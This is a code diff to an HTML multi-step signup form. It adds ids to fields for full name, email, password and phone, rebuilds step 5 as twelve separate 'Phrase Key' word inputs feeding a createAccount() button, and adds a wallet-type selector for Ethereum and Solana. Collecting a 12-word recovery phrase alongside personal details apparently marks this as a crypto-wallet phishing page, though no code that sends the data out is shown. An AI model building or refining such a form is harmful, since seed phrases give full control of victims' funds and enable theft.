@@ -111,7 +111,7 @@ button {
 
   <!-- STEP 1 -->
   <div class="step active">
-    <input type="text" placeholder="Full Name">
+    <input id="name" type="text" placeholder="Full Name">
     <div class="buttons">
       <span></span>
       <button class="next" onclick="nextStep()">Next</button>
@@ -120,7 +120,7 @@ button {
 
   <!-- STEP 2 -->
   <div class="step">
-    <input type="email" placeholder="Email Address">
+    <input id="email" type="email" placeholder="Email Address">
     <div class="buttons">
       <button class="back" onclick="prevStep()">Back</button>
       <button class="next" onclick="nextStep()">Next</button>
@@ -129,7 +129,7 @@ button {
 
   <!-- STEP 3 -->
   <div class="step">
-   <input type="password" placeholder="Create Password">
+   <input id="password" type="password" placeholder="Create Password">
    <div class="buttons">
     <button class="back" onclick="prevStep()">Back</button>
     <button class="next" onclick="nextStep()">Next</button>
@@ -138,30 +138,40 @@ button {
   
   <!-- STEP 4 -->
   <div class="step">
-    <input type="tel" placeholder="Phone Number">
+    <input id="phone" type="tel" placeholder="Phone Number">
     <div class="buttons">
       <button class="back" onclick="prevStep()">Back</button>
       <button class="next" onclick="nextStep()">Next</button>
     </div>
   </div>
 
-  <!-- STEP 5 -->
-  <div class="step">
-    <p>Phrase Key</p>
-    <div class="security-grid">
-      <input maxlength="3"><input maxlength="3"><input maxlength="3"><input maxlength="3">
-      <input maxlength="3"><input maxlength="3"><input maxlength="3"><input maxlength="3">
-      <input maxlength="3"><input maxlength="3"><input maxlength="3"><input maxlength="3">
-    </div>
-    <div class="buttons">
-      <button class="back" onclick="prevStep()">Back</button>
-      <button class="next" onclick="nextStep()">Next</button>
-    </div>
+<!-- STEP 5 -->
+<div class="step">
+  <p>Phrase Key</p>
+  <div class="security-grid">
+    <input id="word1" maxlength="20">
+    <input id="word2" maxlength="20">
+    <input id="word3" maxlength="20">
+    <input id="word4" maxlength="20">
+    <input id="word5" maxlength="20">
+    <input id="word6" maxlength="20">
+    <input id="word7" maxlength="20">
+    <input id="word8" maxlength="20">
+    <input id="word9" maxlength="20">
+    <input id="word10" maxlength="20">
+    <input id="word11" maxlength="20">
+    <input id="word12" maxlength="20">
   </div>
+
+  <div class="buttons">
+    <button class="back" onclick="prevStep()">Back</button>
+    <button class="create" onclick="createAccount()">Create Account</button>
+  </div>
+</div>
 
   <!-- STEP 6 -->
   <div class="step">
-    <select>
+    <select id="wallet type">
       <option value="">Select Wallet Type</option>
       <option>Ethereum</option>
       <option>Solana</option>
